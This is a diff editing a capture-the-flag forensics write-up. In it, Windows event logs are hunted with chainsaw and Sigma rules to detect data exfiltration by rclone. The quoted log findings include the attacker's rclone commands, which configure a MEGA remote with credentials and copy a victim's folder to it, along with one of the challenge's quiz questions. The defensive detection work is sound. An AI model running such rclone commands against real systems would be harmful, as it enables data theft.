@@ -1,4 +1,4 @@
-# Challenge code and description
+# 1 - Challenge code and description
 
 ```
 Pandora's friend and partner, Wade, is the one that leads the investigation into the relic's location.
@@ -13,11 +13,11 @@ To get the flag, you need to start and connect to the docker service and answer 
 
 We are given some windows event viewer logs and some sigma rules for hunting inside logs\
 The challenge description give us some hints to use a tool called `chainsaw` with some custom sigma rules to detect data exfiltiration with `rclone`\
-Actually `[rclone](https://rclone.org/) is a cli tool for data sync with cloud platforms.
+Actually [rclone](https://rclone.org/) is a cli tool for data sync with cloud platforms.
 
 # 2 - Solution
 
-Let's use [chainsaw](https://github.com/WithSecureLabs/chainsaw) and two custom sigma rules `rclone_config_creation.yaml` and `rclone_execution.yaml` to hunt through these windows logs to detect data exfiltiration using `rclone`\
+Let's use [chainsaw](https://github.com/WithSecureLabs/chainsaw) and two custom sigma rules `rclone_config_creation.yaml` and `rclone_execution.yaml` to hunt through these windows logs to detect data exfiltiration using `rclone`
 
 ```bash
 chainsaw hunt Logs/ -s sigma_rules/ --mapping ./chainsaw/mappings/sigma-event-logs-all.yml
@@ -137,7 +137,7 @@ rclone config create remote mega user majmeret@protonmail.com pass FBMeavdiaFZbW
 rclone copy C:\\Users\\Wade\\Desktop\\Relic_location\\ remote:exfiltration -v
 ```
 
-According to challenge description let's launch instance and answer the question to get the flag
+According to challenge description let's launch instance and answer the questions to get the flag
 
 ```bash
 What is the email of the attacker used for the exfiltration process? (for example: name@email.com)
